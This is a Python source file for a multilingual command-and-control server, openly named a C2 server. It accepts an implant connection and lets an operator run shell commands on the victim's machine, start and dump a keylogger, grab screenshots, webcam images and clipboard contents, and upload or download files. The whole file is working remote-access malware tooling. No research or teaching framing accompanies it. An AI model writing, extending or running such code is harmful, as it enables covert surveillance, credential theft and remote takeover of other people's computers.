import socket
import sys
import threading
import os
import json
import datetime
import struct

try:
    from PIL import Image
    PIL_AVAILABLE = True
except:
    PIL_AVAILABLE = False

import crypto
import protocol

LANGUAGES = {
    'en': {
        'welcome': '=== C2 SERVER ===',
        'waiting': 'Waiting for connection on {}:{}...',
        'connected': '[+] Connection from {}:{}',
        'disconnected': '[!] Client disconnected',
        'prompt': 'C2> ',
        'help': 'Commands',
        'exit': 'Exit',
        'screenshot': 'Screenshot',
        'keylog_start': 'Start Keylogger',
        'keylog_stop': 'Stop Keylogger',
        'keylog_dump': 'Dump Keylog',
        'shell': 'Shell Command',
        'upload': 'Upload File',
        'download': 'Download File',
        'clipboard': 'Get Clipboard',
        'webcam': 'Webcam Capture',
        'info': 'System Info',
        'ping': 'Ping Test',
        'clear': 'Clear Screen',
        'language': 'Change Language',
        'invalid': 'Invalid command',
        'select_lang': 'Select language: en/pt/es/fr'
    },
    'pt': {
        'welcome': '=== SERVIDOR C2 ===',
        'waiting': 'Aguardando conexão em {}:{}...',
        'connected': '[+] Conexão de {}:{}',
        'disconnected': '[!] Cliente desconectado',
        'prompt': 'C2> ',
        'help': 'Comandos',
        'exit': 'Sair',
        'screenshot': 'Captura de Tela',
        'keylog_start': 'Iniciar Keylogger',
        'keylog_stop': 'Parar Keylogger',
        'keylog_dump': 'Obter Keylog',
        'shell': 'Comando Shell',
        'upload': 'Enviar Arquivo',
        'download': 'Baixar Arquivo',
        'clipboard': 'Área de Transferência',
        'webcam': 'Capturar Webcam',
        'info': 'Info do Sistema',
        'ping': 'Teste Ping',
        'clear': 'Limpar Tela',
        'language': 'Mudar Idioma',
        'invalid': 'Comando inválido',
        'select_lang': 'Selecione idioma: en/pt/es/fr'
    },
    'es': {
        'welcome': '=== SERVIDOR C2 ===',
        'waiting': 'Esperando conexión en {}:{}...',
        'connected': '[+] Conexión de {}:{}',
        'disconnected': '[!] Cliente desconectado',
        'prompt': 'C2> ',
        'help': 'Comandos',
        'exit': 'Salir',
        'screenshot': 'Captura de Pantalla',
        'keylog_start': 'Iniciar Keylogger',
        'keylog_stop': 'Detener Keylogger',
        'keylog_dump': 'Obtener Keylog',
        'shell': 'Comando Shell',
        'upload': 'Subir Archivo',
        'download': 'Descargar Archivo',
        'clipboard': 'Portapapeles',
        'webcam': 'Capturar Webcam',
        'info': 'Info del Sistema',
        'ping': 'Test Ping',
        'clear': 'Limpiar Pantalla',
        'language': 'Cambiar Idioma',
        'invalid': 'Comando inválido',
        'select_lang': 'Seleccione idioma: en/pt/es/fr'
    },
    'fr': {
        'welcome': '=== SERVEUR C2 ===',
        'waiting': 'En attente de connexion sur {}:{}...',
        'connected': '[+] Connexion de {}:{}',
        'disconnected': '[!] Client déconnecté',
        'prompt': 'C2> ',
        'help': 'Commandes',
        'exit': 'Quitter',
        'screenshot': 'Capture d\'écran',
        'keylog_start': 'Démarrer Keylogger',
        'keylog_stop': 'Arrêter Keylogger',
        'keylog_dump': 'Récupérer Keylog',
        'shell': 'Commande Shell',
        'upload': 'Envoyer Fichier',
        'download': 'Télécharger Fichier',
        'clipboard': 'Presse-papiers',
        'webcam': 'Capturer Webcam',
        'info': 'Info Système',
        'ping': 'Test Ping',
        'clear': 'Effacer Écran',
        'language': 'Changer Langue',
        'invalid': 'Commande invalide',
        'select_lang': 'Sélectionnez langue: en/pt/es/fr'
    }
}

LISTEN_IP = "0.0.0.0"
PORT = 8443

class C2Server:
    def __init__(self):
        self.client_socket = None
        self.client_address = None
        self.running = True
        self.lang = 'en'
        self.crypto = crypto.SecureChannel()
        self.protocol = protocol.ProtocolHandler(self.crypto)
        
    def t(self, key):
        return LANGUAGES.get(self.lang, LANGUAGES['en']).get(key, key)
    
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def show_banner(self):
        banner = f"""
╔══════════════════════════════════════════════════════════════╗
║                    {self.t('welcome')}                      ║
╠══════════════════════════════════════════════════════════════╣
║  Language: {self.lang.upper()}  |  Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}           ║
╚══════════════════════════════════════════════════════════════╝
"""
        print(banner)
    
    def show_dashboard(self):
        self.clear_screen()
        self.show_banner()
        
        print(f"\n┌─ {self.t('help')} ─{'─' * 50}┐")
        print(f"│  /help          - {self.t('help'):<40} │")
        print(f"│  /exit          - {self.t('exit'):<40} │")
        print(f"│  /screenshot    - {self.t('screenshot'):<40} │")
        print(f"│  /keylog_start  - {self.t('keylog_start'):<40} │")
        print(f"│  /keylog_stop   - {self.t('keylog_stop'):<40} │")
        print(f"│  /keylog_dump   - {self.t('keylog_dump'):<40} │")
        print(f"│  /clipboard     - {self.t('clipboard'):<40} │")
        print(f"│  /webcam        - {self.t('webcam'):<40} │")
        print(f"│  /info          - {self.t('info'):<40} │")
        print(f"│  /upload <path> - {self.t('upload'):<40} │")
        print(f"│  /download <f>  - {self.t('download'):<40} │")
        print(f"│  /ping          - {self.t('ping'):<40} │")
        print(f"│  /clear         - {self.t('clear'):<40} │")
        print(f"│  /lang          - {self.t('language'):<40} │")
        print(f"│  <command>      - {self.t('shell'):<40} │")
        print(f"└{'─' * 56}┘\n")
    
    def receive_handler(self):
        while self.running:
            try:
                msg_type, payload = self.protocol.receive(self.client_socket)
                if payload is None:
                    print(f"\n[!] {self.t('disconnected')}")
                    self.running = False
                    break
                
                if msg_type == 'screenshot':
                    self.save_screenshot(payload)
                elif msg_type == 'webcam':
                    self.save_webcam(payload)
                elif msg_type == 'file':
                    self.save_file(payload)
                else:
                    text = payload.decode('utf-8', errors='replace')
                    print(f"\n[+] {text}\n{self.t('prompt')}", end='', flush=True)
                    
            except Exception as e:
                print(f"\n[-] Error: {e}")
                self.running = False
                break
    
    def save_screenshot(self, data):
        try:
            timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'screenshot_{timestamp}.png'
            with open(filename, 'wb') as f:
                f.write(data)
            print(f"\n[+] Screenshot saved: {filename}\n{self.t('prompt')}", end='', flush=True)
        except Exception as e:
            print(f"\n[-] Screenshot error: {e}\n{self.t('prompt')}", end='', flush=True)
    
    def save_webcam(self, data):
        try:
            timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'webcam_{timestamp}.png'
            with open(filename, 'wb') as f:
                f.write(data)
            print(f"\n[+] Webcam saved: {filename}\n{self.t('prompt')}", end='', flush=True)
        except Exception as e:
            print(f"\n[-] Webcam error: {e}\n{self.t('prompt')}", end='', flush=True)
    
    def save_file(self, data):
        try:
            filepath_len = struct.unpack(">I", data[:4])[0]
            filepath = data[4:4+filepath_len].decode('utf-8')
            content = data[4+filepath_len:]
            with open(filepath, 'wb') as f:
                f.write(content)
            print(f"\n[+] File saved: {filepath} ({len(content)} bytes)\n{self.t('prompt')}", end='', flush=True)
        except Exception as e:
            print(f"\n[-] File error: {e}\n{self.t('prompt')}", end='', flush=True)
    
    def send_file(self, filepath):
        try:
            with open(filepath, 'rb') as f:
                content = f.read()
            filename = os.path.basename(filepath)
            filepath_bytes = filename.encode('utf-8')
            header = struct.pack(">I", len(filepath_bytes))
            data = b'[FILE]' + header + filepath_bytes + content
            self.protocol.send(self.client_socket, data)
            print(f"[+] Sent: {filename}")
        except Exception as e:
            print(f"[-] Upload error: {e}")
    
    def select_language(self):
        print(f"\n{self.t('select_lang')}")
        print("1. English (en)")
        print("2. Português (pt)")
        print("3. Español (es)")
        print("4. Français (fr)")
        choice = input("> ").strip()
        
        lang_map = {'1': 'en', '2': 'pt', '3': 'es', '4': 'fr', 
                   'en': 'en', 'pt': 'pt', 'es': 'es', 'fr': 'fr'}
        self.lang = lang_map.get(choice, 'en')
        print(f"[+] Language set to: {self.lang.upper()}")
    
    def handle_command(self, command):
        cmd = command.strip()
        
        if not cmd:
            return True
            
        if cmd == '/help':
            self.show_dashboard()
        elif cmd == '/exit':
            self.protocol.send(self.client_socket, '/exit')
            return False
        elif cmd == '/clear':
            self.show_dashboard()
        elif cmd == '/lang':
            self.select_language()
            self.show_dashboard()
        elif cmd.startswith('/upload '):
            filepath = cmd[8:].strip()
            self.send_file(filepath)
        else:
            self.protocol.send(self.client_socket, cmd)
        
        return True
    
    def start(self):
        self.select_language()
        
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server.bind((LISTEN_IP, PORT))
            server.listen(1)
            print(self.t('waiting').format(LISTEN_IP, PORT))
        except OSError as e:
            print(f"[!] Bind error on {PORT}: {e}")
            sys.exit(1)
        
        try:
            self.client_socket, self.client_address = server.accept()
            print(self.t('connected').format(self.client_address[0], self.client_address[1]))
            
            key = crypto.SecureChannel.recv_key(self.client_socket)
            self.crypto.set_key(key)
            
            self.client_socket.settimeout(None)
            
            recv_thread = threading.Thread(target=self.receive_handler, daemon=True)
            recv_thread.start()
            
            self.show_dashboard()
            
            while self.running:
                try:
                    command = input(self.t('prompt')).strip()
                    if not self.handle_command(command):
                        break
                except KeyboardInterrupt:
                    break
                except EOFError:
                    break
                    
        except KeyboardInterrupt:
            pass
        finally:
            self.running = False
            if self.client_socket:
                try:
                    self.client_socket.close()
                except Exception as e:
                    pass
            server.close()
            print("\n[*] Server shutdown")

if __name__ == "__main__":
    server = C2Server()
    server.start()
